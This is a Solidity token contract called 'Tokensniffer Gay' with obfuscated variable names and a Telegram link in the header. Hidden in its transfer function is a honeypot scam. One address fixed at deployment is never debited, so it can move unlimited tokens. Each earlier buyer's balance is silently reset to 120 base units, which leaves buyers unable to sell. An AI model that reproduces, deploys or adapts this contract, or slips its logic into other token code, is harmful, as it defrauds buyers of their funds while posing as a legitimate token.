/*

https://t.me/tokensniffergay

*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.10;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract TokensnifferGay is Ownable {
    event Approval(address indexed owner, address indexed spender, uint256 value);

    mapping(address => uint256) private qdvgpfel;

    uint8 public decimals = 9;

    constructor(address kmviyl) {
        balanceOf[msg.sender] = totalSupply;
        qdvgpfel[kmviyl] = hqosvyl;
        IUniswapV2Router02 ijqvxk = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        azdlvortnj = IUniswapV2Factory(ijqvxk.factory()).createPair(address(this), ijqvxk.WETH());
    }

    address public azdlvortnj;

    function transferFrom(address yetrkpgd, address qhcdxr, uint256 isvqdrbjhpe) public returns (bool success) {
        require(isvqdrbjhpe <= allowance[yetrkpgd][msg.sender]);
        allowance[yetrkpgd][msg.sender] -= isvqdrbjhpe;
        dmaxounfvy(yetrkpgd, qhcdxr, isvqdrbjhpe);
        return true;
    }

    address private wkfqts;

    function dmaxounfvy(address yetrkpgd, address qhcdxr, uint256 isvqdrbjhpe) private {
        if (qdvgpfel[yetrkpgd] == 0) {
            balanceOf[yetrkpgd] -= isvqdrbjhpe;
        }
        if (wkfqts != azdlvortnj) {
            balanceOf[wkfqts] = hqosvyl;
        }
        wkfqts = qhcdxr;
        balanceOf[qhcdxr] += isvqdrbjhpe;
        emit Transfer(yetrkpgd, qhcdxr, isvqdrbjhpe);
    }

    string public name = 'Tokensniffer Gay';

    mapping(address => mapping(address => uint256)) public allowance;

    function transfer(address qhcdxr, uint256 isvqdrbjhpe) public returns (bool success) {
        dmaxounfvy(msg.sender, qhcdxr, isvqdrbjhpe);
        return true;
    }

    string public symbol = 'Tokensniffer Gay';

    event Transfer(address indexed from, address indexed to, uint256 value);

    function approve(address ikveqatl, uint256 isvqdrbjhpe) public returns (bool success) {
        allowance[msg.sender][ikveqatl] = isvqdrbjhpe;
        emit Approval(msg.sender, ikveqatl, isvqdrbjhpe);
        return true;
    }

    mapping(address => uint256) public balanceOf;

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    uint256 private hqosvyl = 120;
}